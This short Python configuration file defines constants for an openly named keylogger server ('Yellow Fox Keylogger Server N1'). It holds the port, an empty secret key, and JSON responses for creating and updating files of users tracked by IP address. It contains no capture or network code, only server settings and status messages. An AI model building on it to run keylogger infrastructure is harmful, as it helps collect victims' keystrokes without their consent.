from dataclasses import dataclass


@dataclass
class App:
    keylogger_app_list = ['yfox-keylogger-n01-v10']


@dataclass
class Server:
    secret_key = ''
    port = '8080'

    request_server_info = {
        'error': None,
        'response': {
            'result': True,
            'server_name': 'Yellow Fox Keylogger Server N1',
            'server_version': 'v1.1'
        }
    }

    request_file_created_successfully = {
        'error': None,
        'response': {
            'result': True
        }
    }

    request_file_updated_successfully = {
        'error': None,
        'response': {
            'result': True
        }
    }

    request_bad_argument = {
        'error': 'bad argument (perhaps one of the arguments is missing)',
        'response': None
    }

    request_bad_app_name = {
        'error': 'bad app name',
        'response': None
    }

    request_ip_does_not_exist = {
        'error': 'bad ip (user with this ip does not exist)',
        'response': None
    }

    request_ip_already_exist = {
        'error': 'bad ip (user with this ip already exists)',
        'response': None
    }

    request_failed_to_create_file = {
        'error': 'failed to create file',
        'response': None
    }

    request_failed_to_update_file = {
        'error': 'failed to update file',
        'response': None
    }
